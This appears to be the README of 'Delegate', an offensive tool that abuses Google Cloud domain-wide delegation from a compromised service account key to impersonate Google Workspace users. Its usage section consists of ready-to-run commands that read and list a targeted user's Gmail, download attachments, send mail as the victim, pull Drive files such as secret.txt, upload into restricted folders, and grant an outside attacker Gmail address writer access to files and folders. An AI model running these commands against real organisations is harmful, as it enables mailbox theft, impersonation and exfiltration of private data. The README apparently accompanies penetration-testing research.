# Delegate
Tool to perform GCP Domain Wide Delegation abuse and access Gmail and Drive data from a compromised Service Account with domain wide delegation permissions configured within Google Workspace.

--> [Domain Wide Delegation article](https://medium.com/@lutzenfried/gcp-domain-wide-delegation-abuses-b82b8dd8cf15)

<img src="./Images/DomainWideDelegation_GCP.png" alt="gcpdelegation" width="800"/>

## Delegate tool usage
### Gmail usage
List all Gmail emails (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a list
```

Read Gmail emails (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a read
```

List Gmail folders (Labels)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a folders
```

Download all attachments within the targeted Gmail (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a attachments
```

Read all emails within specified folder (Labels) (limit 200 emails)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a read -f DRAFT
```

Send an email as targeted.delegated@mackinsoncloud.com to jdoe@gmail.com specifying subject and body email content
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m gmail -a send -r jdoe@gmail.com -s "Test Messaage subject" -c "Hello this is a test email"
```

### Drive usage

List all files and folders within the targeted Drive account
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a list
```

List all folders content within the targeted Drive account
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a folders
```

Download locally a specific file secret.txt
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a download -t secret.txt
```

Upload files at user's Drive root folder (My Drive)
```
python3 delegate.py -k <serviceaccount_key> -m drive -a upload -i <targeted_Workspace_user> -t <localfile> -p <NameInDrive>
python3 delegate.py -k ../sa_key.json -m drive -a upload -i targeted.delegated@mackinsoncloud.com -t test.txt -p uploadedTest.txt
```

Upload files within specific user's Drive folder or organizational Shared Drive
```
python3 delegate.py -k <serviceaccount_key> -m drive -a upload -i <targeted_Workspace_user> -t <localfile> -p <NameInDrive> -f <DriveFolder>
python3 delegate.py -k ../sa_key.json -m drive -a upload -i targeted.delegated@mackinsoncloud.com -t test.txt -p uploadedTest.txt -f Restricted_documents
```

Modify permissions on specific folder (Add external Gmail account with Writer permissions over the file/folder)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a permissions -t Restricted_documents -e attackeremail@gmail.com
```

Modify permissions on specific file (Add external Gmail account with Writer permissions over the file/folder)
```
python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -a permissions -t secrets.txt -e attackeremail@gmail.com
```
